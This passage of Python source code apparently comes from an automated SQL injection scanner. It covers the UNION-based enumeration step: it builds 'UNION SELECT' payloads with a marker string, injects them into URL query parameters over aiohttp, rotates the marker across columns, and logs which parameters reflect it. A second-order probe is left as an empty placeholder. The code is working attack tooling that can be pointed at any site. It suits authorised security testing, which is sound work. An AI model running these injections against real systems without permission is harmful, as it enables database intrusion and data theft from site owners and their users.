                attempts.append({"url": test_url, "parameter": key, "payload": inj, "technique": "union_enumeration", "success": False, "notes": f"{e}"})
        if max_cols <= 0:
            max_cols = 3  # fallback

        # Try a UNION marker; find a text-capable column
        # First attempt: place marker in the last column
        nulls = ",".join(["NULL"] * (max_cols - 1) + ["'UNION_MARK'"])
        inj = f"-1 UNION SELECT {nulls}-- "
        new = dict(base_qs)
        new[key] = inj
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(new, doseq=True), parsed.fragment))
        try:
            async with session.get(test_url, timeout=self.timeout) as resp:
                text = await resp.text(errors="ignore")
                hit = "UNION_MARK" in text
                attempts.append({"url": test_url, "parameter": key, "payload": inj, "technique": "union_enumeration", "success": bool(hit), "notes": "marker reflected" if hit else ""})
                if hit:
                    results.append(SQLITestResult(url=test_url, parameter=key, vector=inj, injection_type="union", vulnerable=True, evidence="marker reflected", dbms=None))
                else:
                    # Rotate the marker position across columns
                    for pos in range(max_cols - 1):
                        cols = ["NULL"] * max_cols
                        cols[pos] = "'UNION_MARK'"
                        inj2 = f"-1 UNION SELECT {','.join(cols)}-- "
                        new2 = dict(base_qs)
                        new2[key] = inj2
                        test_url2 = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(new2, doseq=True), parsed.fragment))
                        try:
                            async with session.get(test_url2, timeout=self.timeout) as resp2:
                                text2 = await resp2.text(errors="ignore")
                                hit2 = "UNION_MARK" in text2
                                attempts.append({"url": test_url2, "parameter": key, "payload": inj2, "technique": "union_enumeration", "success": bool(hit2), "notes": "marker reflected" if hit2 else ""})
                                if hit2:
                                    results.append(SQLITestResult(url=test_url2, parameter=key, vector=inj2, injection_type="union", vulnerable=True, evidence="marker reflected (rotated)", dbms=None))
                                    break
                        except Exception as e:
                            attempts.append({"url": test_url2, "parameter": key, "payload": inj2, "technique": "union_enumeration", "success": False, "notes": f"{e}"})
        except Exception as e:
            attempts.append({"url": test_url, "parameter": key, "payload": inj, "technique": "union_enumeration", "success": False, "notes": f"{e}"})

        return results, attempts

    async def _run_second_order_probe(
        self, url: str, session: aiohttp.ClientSession, is_login: bool = False
    ) -> Tuple[List[SQLITestResult], List[Dict[str, Any]]]:
        """
        Placeholder: implement plant → revisit (e.g., submit a username containing a payload,
        then hit a profile page where it renders). For now, returns nothing.
        """
        return [], []